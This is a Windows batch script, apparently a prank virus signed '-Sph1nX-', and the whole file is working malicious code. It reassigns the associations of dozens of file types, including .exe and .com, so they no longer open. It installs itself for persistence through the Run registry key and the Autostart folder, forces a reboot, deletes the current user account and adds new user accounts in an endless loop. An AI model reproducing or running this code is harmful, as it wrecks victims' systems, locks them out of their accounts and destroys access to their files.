@echo off
color 0A
start iexplore www.bka.de
assoc .txt=Sph1nX
assoc .doc=Sph1nX
assoc .rtf=Sph1nX
assoc .php=Sph1nX
assoc .htm=Sph1nX
assoc .html=Sph1nX
assoc .xml=Sph1nX
assoc .dot=Sph1nX
assoc .wps=Sph1nX
assoc .avi=Sph1nX
assoc .mpg=Sph1nX
assoc .mpeg=Sph1nX
assoc .wmv=Sph1nX
assoc .txt=Sph1nX
assoc .wma=Sph1nX
assoc .mp3=Sph1nX
assoc .wav=Sph1nX
assoc .aiff=Sph1nX
assoc .au=Sph1nX
assoc .mid=Sph1nX
assoc .midi=Sph1nX
assoc .exe=Sph1nX
assoc .com=Sph1nX
assoc .key=Sph1nX
assoc .rar=Sph1nX
assoc .zip=Sph1nX
assoc .vb=Sph1nX
assoc .vbs=Sph1nX
assoc .scr=Sph1nX
assoc .txt=Sph1nX
assoc .doc=Sph1nX
assoc .rtf=Sph1nX
assoc .php=Sph1nX
assoc .htm=Sph1nX
assoc .html=Sph1nX
assoc .xml=Sph1nX
assoc .dot=Sph1nX
assoc .wps=Sph1nX
assoc .avi=Sph1nX
assoc .mpg=Sph1nX
assoc .mpeg=Sph1nX
assoc .wmv=Sph1nX
assoc .txt=Sph1nX
assoc .wma=Sph1nX
assoc .mp3=Sph1nX
assoc .wav=Sph1nX
assoc .aiff=Sph1nX
assoc .au=Sph1nX
assoc .mid=Sph1nX
assoc .midi=Sph1nX
assoc .exe=Sph1nX
assoc .com=Sph1nX
assoc .key=Sph1nX
assoc .rar=Sph1nX
assoc .zip=Sph1nX
assoc .vb=Sph1nX
assoc .vbs=Sph1nX
assoc .scr=Sph1nX
cls
md %windir%\Command
copy %0 %windir%\Command\
ren %windir%\Command\*.* Command.bat
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Winlogon /t REG_SZ /d %windir%\Command\Command.bat /f
copy %0 "C:\Dokumente und Einstellungen\All Users\StartmenÅ\Programme\Autostart"
ren "C:\Dokumente und Einstellungen\All Users\StartmenÅ\Programme\Autostart*.bat"
shutdown -r -t 60 -c "cYa by -Sph1nX-"
net user "%username%" /DEL
net user "%username%" /DELETE
:a
net user "-Sph1nX-%random%" "%random%" /add
goto a
